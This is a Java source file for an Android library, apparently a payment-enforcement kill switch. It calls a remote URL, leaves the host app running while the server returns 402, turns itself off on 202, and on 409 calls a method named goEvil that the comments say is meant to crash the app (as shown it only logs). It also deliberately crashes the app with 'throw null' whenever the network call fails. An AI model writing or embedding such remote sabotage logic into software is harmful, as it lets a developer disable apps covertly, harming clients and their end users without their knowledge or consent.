package im.avi.littlefinger;

import android.app.NotificationManager;
import android.content.Context;
import android.content.SharedPreferences;
import android.support.v4.app.NotificationCompat;
import android.util.Log;

import java.io.IOException;
import java.net.HttpURLConnection;

import org.json.JSONObject;
import org.json.JSONException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class LittleFinger {

    private static Context context;
    private static OkHttpClient client = new OkHttpClient();
    private static final String PREF_SHOULD_CALL = "should_call";

    public static void init(Context ctx, String urlString) {
        context = ctx;

        if (!shouldMakeCall()) {
            //
            return;
        }

        try {
            makeHttpCall(urlString);
        } catch (IOException ex) {
            throw null;
        }
    }

    private static void makeHttpCall(String url) throws IOException {
        Request request = new Request.Builder()
                .url(url)
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                // HTTP call itself failed
                // crash the app
                throw null;
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                responseHandler(response);
            }
        });
    }

    private static void responseHandler(Response response) {
        if (response.code() == HttpURLConnection.HTTP_PAYMENT_REQUIRED) {
            // do nothing
            // we are waiting for payment, hence let the app work as expected
        } else if (response.code() == HttpURLConnection.HTTP_ACCEPTED) {
            // received the payment
            // disable HTTP calls
            cancelCall();
        } else if (response.code() == HttpURLConnection.HTTP_CONFLICT){
            // no payment received
            // time to crash the app
            goEvil(response);
        }
    }

    private static void goEvil(Response response) {
        try {
            String jsonData = response.body().string();
            JSONObject jobject = new JSONObject(jsonData);
            Log.d("h", jobject.getString("origin"));
        } catch (IOException | JSONException ex) {
            // Don't do anything
        }
    }

    private static void displayNotification() {
        NotificationCompat.Builder mBuilder =
                new NotificationCompat.Builder(context)
                        .setSmallIcon(R.drawable.ic_evil)
                        .setContentTitle("My notification")
                        .setContentText("Hello World!");

        NotificationManager mNotificationManager =
                (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);

        mNotificationManager.notify(001, mBuilder.build());
    }

    private static boolean shouldMakeCall() {
        return Boolean.valueOf(Utils.readSharedSetting(context,
                PREF_SHOULD_CALL, "true"));
    }

    private static void cancelCall() {
        Utils.saveSharedSetting(context, PREF_SHOULD_CALL, "false");
    }

}

class Utils {

    private static final String PREFERENCES_FILE = "little_finger_settings";

    static String readSharedSetting(Context ctx, String settingName, String defaultValue) {
        SharedPreferences sharedPref = ctx.getSharedPreferences(PREFERENCES_FILE, Context.MODE_PRIVATE);
        return sharedPref.getString(settingName, defaultValue);
    }

    static void saveSharedSetting(Context ctx, String settingName, String settingValue) {
        SharedPreferences sharedPref = ctx.getSharedPreferences(PREFERENCES_FILE, Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPref.edit();
        editor.putString(settingName, settingValue);
        editor.apply();
    }
}